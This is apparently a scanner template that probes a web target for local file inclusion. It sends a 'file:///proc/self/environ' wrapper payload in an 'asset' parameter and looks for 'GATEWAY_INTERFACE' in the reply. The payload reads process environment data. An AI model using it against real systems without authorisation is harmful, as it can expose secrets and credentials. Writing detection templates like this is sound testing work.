id: lfi5-070
name: 'Wrapper file via asset'
severity: high
type: active
tags:
  - lfi
  - traversal
  - wrapper
description: 'Reads file via file wrapper'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      asset:
        - 'file:///proc/self/environ'
    matchers:
      - type: word
        part: body
        words:
          - 'GATEWAY_INTERFACE'
